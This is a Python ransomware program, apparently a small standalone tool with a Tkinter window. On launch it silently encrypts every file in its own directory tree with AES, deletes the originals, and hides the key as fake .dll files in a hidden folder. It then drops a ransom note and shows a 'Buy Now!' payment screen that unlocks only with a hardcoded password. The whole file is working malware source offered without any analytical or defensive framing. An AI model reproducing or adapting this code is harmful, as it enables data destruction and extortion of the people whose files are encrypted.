import os
import json
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import ctypes  
import tkinter as tk
from tkinter import messagebox, simpledialog

def create_hidden_folder(folder_path):
    """
    Creates a hidden folder at the specified path.
    """
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Hidden folder created at: {folder_path}")
        # Set the folder as hidden (Windows-specific)
        result = ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)
        if result == 0:
            print(f"Failed to set hidden attribute for: {folder_path}")
        else:
            print(f"Hidden attribute set for: {folder_path}")

def save_key_to_dll(hidden_folder, key, iv):
    """
    Saves the AES key and IV to a .dll file in the hidden folder.
    """
    key_file = os.path.join(hidden_folder, "key.dll")
    print(f"Saving AES key to: {key_file}")
    with open(key_file, "wb") as f:
        f.write(key)
    
    iv_file = os.path.join(hidden_folder, "iv.dll")
    print(f"Saving IV to: {iv_file}")
    with open(iv_file, "wb") as f:
        f.write(iv)
    
    print("Encryption parameters saved successfully")

def load_key_from_dll(hidden_folder):
    """
    Loads the AES key and IV from the .dll files in the hidden folder.
    """
    key_file = os.path.join(hidden_folder, "key.dll")
    iv_file = os.path.join(hidden_folder, "iv.dll")
    
    with open(key_file, "rb") as f:
        key = f.read()
    
    with open(iv_file, "rb") as f:
        iv = f.read()
    
    return key, iv

def get_files_to_encrypt(base_dir):
    """
    Get all files to encrypt, excluding the script itself and specific directories.
    """
    files_to_encrypt = []
    exe_name = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
    hidden_folder_name = ".hidden_folder"
    
    for root, dirs, files in os.walk(base_dir):
        # Skip the hidden folder and Python libraries
        dirs[:] = [d for d in dirs if d != hidden_folder_name and d != "Crypto" and d != "__pycache__"]
        
        for file in files:
            # Skip the executable and special files
            if (file == exe_name or file.endswith(".dll") or file.endswith(".pyd") or 
                file == "base_library.zip" or file.endswith(".encrypted")):
                continue
            
            file_path = os.path.join(root, file)
            files_to_encrypt.append(file_path)
    
    return files_to_encrypt

def encrypt_file_in_place(file_path, key, iv):
    """
    Encrypts a file in-place.
    """
    try:
        # Read the original file
        with open(file_path, "rb") as f:
            plaintext = f.read()
        
        # Create a cipher object and encrypt the data
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        
        # Write the encrypted data back to a new file
        encrypted_path = file_path + ".encrypted"
        with open(encrypted_path, "wb") as f:
            f.write(ciphertext)
        
        # Delete the original file
        os.remove(file_path)
        
        print(f"Encrypted: {file_path}")
        return True
    except Exception as e:
        print(f"Error encrypting {file_path}: {str(e)}")
        return False

def decrypt_file_in_place(encrypted_file, key, iv):
    """
    Decrypts a file in-place.
    """
    try:
        # Ensure the file has the .encrypted extension
        if not encrypted_file.endswith(".encrypted"):
            print(f"Skipping {encrypted_file} - not an encrypted file")
            return False
        
        # Original file path
        original_file = encrypted_file[:-10]  # Remove '.encrypted'
        
        # Read the encrypted file
        with open(encrypted_file, "rb") as f:
            ciphertext = f.read()
        
        # Create a cipher object and decrypt the data
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        
        # Write the decrypted data back to the original file
        with open(original_file, "wb") as f:
            f.write(plaintext)
        
        # Delete the encrypted file
        os.remove(encrypted_file)
        
        print(f"Decrypted: {encrypted_file}")
        return True
    except Exception as e:
        print(f"Error decrypting {encrypted_file}: {str(e)}")
        return False

# Get the directory where the executable or script is located
BASE_DIR = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))

def encrypt_files():
    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
    if not os.path.exists(hidden_folder):
        # Generate encryption key and IV
        aes_key = get_random_bytes(16)
        iv = get_random_bytes(16)
        
        # Create hidden folder and save key/IV
        create_hidden_folder(hidden_folder)
        save_key_to_dll(hidden_folder, aes_key, iv)
        
        # Get files to encrypt
        files_to_encrypt = get_files_to_encrypt(BASE_DIR)
        
        # Encrypt each file in-place
        success_count = 0
        for file_path in files_to_encrypt:
            if encrypt_file_in_place(file_path, aes_key, iv):
                success_count += 1
        
        # Create the ransom note
        create_ransom_note()
        
        messagebox.showinfo("Encryption Complete", f"{success_count} files have been encrypted.")
    else:
        messagebox.showwarning("Already Encrypted", "Files are already encrypted.")

def decrypt_files():
    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
    if os.path.exists(hidden_folder):
        # Prompt user for password
        password = simpledialog.askstring("Password Required", "Enter the decryption password:", show="*")
        if not password:
            messagebox.showwarning("Decryption Canceled", "No password entered. Decryption canceled.")
            return

        # Verify password
        if password != "1234":
            messagebox.showerror("Error", "Incorrect password. Decryption failed.")
            return
        
        try:
            # Load the AES key and IV from the hidden folder
            aes_key, iv = load_key_from_dll(hidden_folder)
            
            # Find all encrypted files
            encrypted_files = []
            for root, _, files in os.walk(BASE_DIR):
                for file in files:
                    if file.endswith(".encrypted"):
                        encrypted_files.append(os.path.join(root, file))
            
            # Decrypt each file in-place
            success_count = 0
            for file_path in encrypted_files:
                if decrypt_file_in_place(file_path, aes_key, iv):
                    success_count += 1
            
            # Remove the ransom note if it exists
            ransom_note_path = os.path.join(BASE_DIR, "RANSOM_NOTE.txt")
            if os.path.exists(ransom_note_path):
                os.remove(ransom_note_path)
            
            # Clean up the hidden folder
            os.remove(os.path.join(hidden_folder, "key.dll"))
            os.remove(os.path.join(hidden_folder, "iv.dll"))
            os.rmdir(hidden_folder)
            
            messagebox.showinfo("Decryption Complete", f"{success_count} files have been decrypted.")
        except Exception as e:
            messagebox.showerror("Error", f"Decryption failed: {str(e)}")
    else:
        messagebox.showwarning("No Encrypted Data", "No encrypted data found to decrypt.")

def create_ransom_note():
    """
    Creates a ransom note in the base directory.
    """
    note_content = """
    YOUR FILES HAVE BEEN ENCRYPTED!
    
    All your personal files have been encrypted with a strong algorithm.
    To decrypt your files, you need to pay the ransom and obtain the decryption password.
    
    To decrypt your files:
    1. Launch this application
    2. Click on "Buy Now!" button
    3. Enter the password you received after payment
    
    WARNING: Do not attempt to decrypt files using other tools or delete this application,
    as this may result in permanent data loss.
    """
    
    with open(os.path.join(BASE_DIR, "RANSOM_NOTE.txt"), "w") as f:
        f.write(note_content)

def auto_check():
    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
    if not os.path.exists(hidden_folder):
        # Automatically encrypt if no hidden folder exists
        encrypt_files()
        sys.exit(0)

def main():
    auto_check()
    root = tk.Tk()
    root.title("File Encryptor/Decryptor")

    tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED", font=("Arial", 16, "bold"), fg="red").pack(pady=10)
    tk.Label(root, text="Pay the ransom to receive the decryption password", font=("Arial", 12)).pack(pady=5)

    decrypt_button = tk.Button(root, text="Buy Now!", command=decrypt_files, width=20, height=2)
    decrypt_button.pack(pady=10)

    root.mainloop()

if __name__ == "__main__":
    main()